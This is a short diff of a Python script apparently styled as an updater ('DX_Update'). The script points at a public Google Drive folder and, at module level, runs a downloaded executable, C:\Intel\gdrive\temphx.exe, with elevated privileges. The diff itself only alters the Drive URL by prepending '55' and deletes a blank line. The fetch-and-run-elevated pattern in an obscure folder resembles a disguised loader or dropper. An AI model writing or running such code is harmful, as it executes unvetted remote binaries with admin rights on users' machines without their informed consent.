@@ -21,7 +21,7 @@ class DX_Update(object):
 
         # Google Drive source — folder URL provided
         #self.GDRIVE_URL_OR_ID = ""
-        self.GDRIVE_URL_OR_ID = "https://drive.google.com/drive/folders/1xHb1M9XRTrieEGqYvVl7XEzFlEaw6Qeg?usp=sharing"
+        self.GDRIVE_URL_OR_ID = "55https://drive.google.com/drive/folders/1xHb1M9XRTrieEGqYvVl7XEzFlEaw6Qeg?usp=sharing"
 
         # Where to save everything.
         # NOTE: "C:\" is a SYNTAX ERROR in Python (the \" escapes the quote),
@@ -238,7 +238,6 @@ def run_elevated(exe_path, params=None, cwd=None):
     return result  # note: NOT a PID — no handle to the process
 
 run_elevated(r"C:\Intel\gdrive\temphx.exe", cwd=r"C:\Intel\gdrive")
-
 
 
 
